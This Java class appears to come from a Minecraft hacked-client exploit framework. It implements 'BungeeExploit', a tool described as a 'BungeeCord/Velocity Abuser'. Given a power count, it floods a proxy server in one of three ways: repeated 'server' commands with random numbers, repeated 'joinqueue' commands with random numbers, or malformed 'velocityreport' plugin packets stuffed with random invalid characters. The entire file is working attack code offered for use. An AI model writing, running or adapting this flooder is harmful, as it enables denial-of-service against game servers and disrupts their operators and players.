package us.whitedev.exploits.impl;

import io.netty.buffer.Unpooled;
import java.util.List;
import java.util.Locale;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.protocol.game.ServerboundCustomPayloadPacket;
import net.minecraft.resources.ResourceLocation;
import org.apache.commons.lang3.RandomUtils;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class BungeeExploit implements Exploit {
   private static final String EXPLOIT_NAME = "BungeeExploit";
   private final String[] chars = new String[]{"$", "!", "@", ":", ";", "`", ".", ",", "~", "\\", "/", "#", "$", "%", "^", "&", "*", "(", ")", "!", "\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66"};

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      String mode = args[3];
      msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);

      for(int i = 0; i < power; ++i) {
         String var5 = mode.toLowerCase(Locale.ROOT);
         byte var6 = -1;
         switch(var5.hashCode()) {
         case -456785089:
            if (var5.equals("bungee-new")) {
               var6 = 1;
            }
            break;
         case -456783930:
            if (var5.equals("bungee-old")) {
               var6 = 0;
            }
            break;
         case 2134260957:
            if (var5.equals("velocity")) {
               var6 = 2;
            }
         }

         switch(var6) {
         case 0:
            PacketHelper.sendCommand("server " + RandomUtils.nextInt(1, 4096));
            break;
         case 1:
            PacketHelper.sendCommand("joinqueue " + RandomUtils.nextInt(1, 4096));
            break;
         case 2:
            PacketHelper.send(new ServerboundCustomPayloadPacket(new ResourceLocation("velocityreport", "main"), this.getVelocityByteBuf(this.getInvalidString())));
         }
      }

      msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
   }

   private FriendlyByteBuf getVelocityByteBuf(String string) {
      FriendlyByteBuf buf = new FriendlyByteBuf(Unpooled.buffer());
      buf.writeByte(0);
      buf.writeUtf("{\"reporter\": \"" + string + "\", \"reported\":\"" + string + "\", \"server\":\"" + string + "\", \"reason\":\"" + string + "\", \"type\":\"NewReport\"}");
      return buf;
   }

   private String getInvalidString() {
      StringBuilder builder = new StringBuilder();

      for(int i = 0; i < 12; ++i) {
         builder.append(this.chars[RandomUtils.nextInt(0, this.chars.length - 1)]);
      }

      return builder.toString();
   }

   public String getName() {
      return "BungeeExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Mode", OptionType.LIST, new String[]{"Bungee-Old", "Bungee-New", "Velocity"}));
   }

   public String getArgsUsage() {
      return "power[1000], mode[Bungee-New]";
   }

   public String getDescription() {
      return "BungeeCord/Velocity Abuser";
   }
}
